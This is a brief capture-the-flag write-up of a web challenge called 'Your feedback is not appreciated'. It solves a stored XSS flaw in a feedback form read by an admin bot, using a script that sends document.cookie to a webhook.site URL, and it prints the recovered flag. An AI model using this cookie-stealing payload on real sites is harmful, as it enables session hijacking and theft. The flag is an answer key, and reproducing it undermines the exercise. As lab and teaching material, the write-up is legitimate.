---
title: "Your feedback is not appreciated"
description: "RISC intro2web challenge 4"
pubDate: "Aug 26 2025"
heroImage: "/hero/RISC.webp"
tags: ["cyber", "XSS", "ctf", "exploit"]
---

###### [Canonical > RISC](https://writeups.urisc.club/web/4_your-feedback_is_not_appreciated/)

## Challenge description

NB: This is the challenge related to the admin bot

Yuri Nocashov has taken a deep interest in customer feedback, and will read all feedback forms submitted!

---

## Approach

So someone is viewing all the feedback, it's very likely this is a client side XSS attack.

Lets create a webhook and attempt to send it something through the feedback form.

If we go to <https://webhook.site> we can easily get a public webhook open.

### Javascript XSS implementation

```html
<script>
	fetch(`https://webhook.site/our-webhook-id?${document.cookie}`);
</script>
```

After sending the script as feedback, we can see an incoming requests to `https://webhook.site/our-webhook-id?flag=RISC{ex_ess_ess_is_easy_as_1_2_3_e78c1cda77704a884357eeffedb3d3e7}`

Our flag is:

```
RISC{ex_ess_ess_is_easy_as_1_2_3_e78c1cda77704a884357eeffedb3d3e7}
```
